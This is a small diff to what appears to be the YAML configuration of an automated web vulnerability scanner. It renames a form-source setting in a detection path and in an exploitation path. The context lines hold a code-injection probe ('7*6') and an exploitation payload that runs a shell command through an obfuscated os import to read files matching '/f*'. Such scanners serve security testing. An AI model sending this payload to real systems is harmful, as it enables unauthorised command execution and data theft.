@@ -34,7 +34,7 @@ detection_paths:
         action: http_request
         with:
           method: GET
-          request_source: forms
+          request_source: discovered_forms
           inject_into: all_params
           payloads:
             - "7*6"
@@ -67,7 +67,7 @@ exploitation_paths:
         action: http_request
         with:
           method: GET
-          request_source: forms
+          request_source: discovered_forms
           inject_into: vulnerable_param
           payloads:
             - "__import__('o'+'s').popen('nl /f*').read()"
